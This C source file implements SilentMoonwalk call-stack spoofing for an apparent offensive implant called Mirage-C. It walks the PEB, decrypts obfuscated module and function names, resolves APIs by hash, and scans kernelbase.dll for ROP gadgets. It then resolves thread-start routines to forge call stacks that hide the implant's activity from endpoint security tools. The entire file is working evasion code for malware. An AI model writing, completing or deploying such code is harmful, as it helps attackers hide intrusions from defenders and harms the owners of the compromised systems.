/*
 * stack_spoof.c — SilentMoonwalk stack spoofing for Mirage-C
 * PEB-walk only, CRT-free. Scans kernelbase.dll .text section
 * for a return hop gadget (default 48 8B 00 C3; FF 23 when
 * SPOOF_JMP_RBX is defined) and ADD_RSP (48 83 C4 xx C3),
 * records the real ADD_RSP imm8 in cfg->rsp_adjust, and resolves
 * RtlUserThreadStart + BaseThreadInitThunk.
 *
 * Reference: SilentMoonwalk technique
 *   https://github.com/klezVirus/SilentMoonwalk
 */

#include "stack_spoof.h"
#ifdef _WIN32
#include <windows.h>
#endif
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include "config.h"
#include "nt_types.h"
#include <stddef.h>



/* ── Global state ────────────────────────────────────────── */
int g_spoof_ready = 0;
spoof_cfg_t g_spoof_cfg = {0};

/* ── Helpers ─────────────────────────────────────────────── */

static void *get_module_base(const unsigned char *enc_name, size_t enc_len) {
    char dll[32];
    enc_decrypt(enc_name, enc_len, dll);
    return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
}

static void *get_func(void *mod, const unsigned char *enc_name, size_t enc_len) {
    char name[64];
    enc_decrypt(enc_name, enc_len, name);
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int get_text_bounds(void *base, uintptr_t *start, uintptr_t *end) {
    uint8_t *bp = (uint8_t *)base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)bp;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    uint32_t off = (uint32_t)dos->e_lfanew;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(bp + off);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    uint32_t so = off + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)
               + nt->FileHeader.SizeOfOptionalHeader;
    PIMAGE_SECTION_HEADER sc = (PIMAGE_SECTION_HEADER)(bp + so);
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sc[i].Name[0] == '.' && sc[i].Name[1] == 't' &&
            sc[i].Name[2] == 'e' && sc[i].Name[3] == 'x' && sc[i].Name[4] == 't') {
            *start = (uintptr_t)bp + sc[i].VirtualAddress;
            *end = *start + sc[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ── Gadget scanning ─────────────────────────────────────── */


/* ── Gadget scanning ─────────────────────────────────────── */

/*
 * find_jmp_rbx — locate the return-address-reload gadget.
 *
 * Primary:  48 8B 00 C3  (mov rax,[rax]; ret) — pure ret-based hop
 * that keeps non-volatile registers intact (the asm stub no longer
 * corrupts RBX).
 * Fallback: FF 23 (jmp [rbx]) — the classic SilentMoonwalk gadget;
 * only compiled in when SPOOF_JMP_RBX is defined because it relies
 * on the asm stub leaving RBX pointed at fake[1] and it corrupts RBX.
 */
static int find_jmp_rbx(const uint8_t *text, uintptr_t len, uintptr_t *out) {
#ifdef SPOOF_JMP_RBX
    for (uintptr_t i = 0; i + 1 < len; i++) {
        if (text[i] == 0xFF && text[i + 1] == 0x23) {
            *out = i;
            return 1;
        }
    }
    return 0;
#else
    for (uintptr_t i = 0; i + 3 < len; i++) {
        if (text[i] == 0x48 && text[i + 1] == 0x8B &&
            text[i + 2] == 0x00 && text[i + 3] == 0xC3) {
            *out = i;
            return 1;
        }
    }
    return 0;
#endif
}

/* Find ADD_RSP,imm8;ret: 48 83 C4 xx C3. Records the actual imm8 in
 * *adjust so the C-side chain math uses the real gadget behavior. */
static int find_add_rsp(const uint8_t *text, uintptr_t len,
                        uintptr_t *out, uint8_t *adjust) {
    /* Prefer 48 83 C4 08 C3 (imm8 = 8) */
    for (uintptr_t i = 0; i + 4 < len; i++) {
        if (text[i] == 0x48 && text[i + 1] == 0x83 &&
            text[i + 2] == 0xC4 && text[i + 3] == 0x08 &&
            text[i + 4] == 0xC3) {
            *out = i;
            *adjust = 0x08;
            return 1;
        }
    }
    /* Fallback: any 48 83 C4 xx C3 — record its real imm8 */
    for (uintptr_t i = 0; i + 4 < len; i++) {
        if (text[i] == 0x48 && text[i + 1] == 0x83 &&
            text[i + 2] == 0xC4 && text[i + 4] == 0xC3) {
            *out = i;
            *adjust = text[i + 3];
            return 1;
        }
    }
    return 0;
}


/* ── Public API ──────────────────────────────────────────── */

int spoof_init(void) {
    void *kbase = get_module_base(enc_kernelbase, ENC_KERNELBASE_LEN);
    if (!kbase) return 0;

    uintptr_t text_start, text_end;
    if (!get_text_bounds(kbase, &text_start, &text_end)) return 0;
    uintptr_t text_len = text_end - text_start;
    const uint8_t *s = (const uint8_t *)text_start;

    uintptr_t off;
    uint8_t  rsp_adjust = 0;
    if (!find_jmp_rbx(s, text_len, &off)) return 0;
    g_spoof_cfg.jmp_rbx_gadget = text_start + off;

    if (!find_add_rsp(s, text_len, &off, &rsp_adjust)) return 0;
    g_spoof_cfg.add_rsp_gadget = text_start + off;
    g_spoof_cfg.rsp_adjust     = rsp_adjust;

    void *ntdll = get_module_base(enc_ntdll, ENC_NTDLL_LEN);
    if (!ntdll) return 0;
    void *f = get_func(ntdll, enc_RtlUserThreadStart, ENC_RTLUSERTHREADSTART_LEN);
    if (!f) return 0;
    g_spoof_cfg.rtl_user_thread_start = (uint64_t)f;

    void *k32 = get_module_base(enc_kernel32, ENC_KERNEL32_LEN);
    if (!k32) return 0;
    f = get_func(k32, enc_BaseThreadInitThunk, ENC_BASETHREADINITTHUNK_LEN);
    if (!f) return 0;
    g_spoof_cfg.base_thread_init_thunk = (uint64_t)f;

    g_spoof_ready = 1;
    return 1;
}
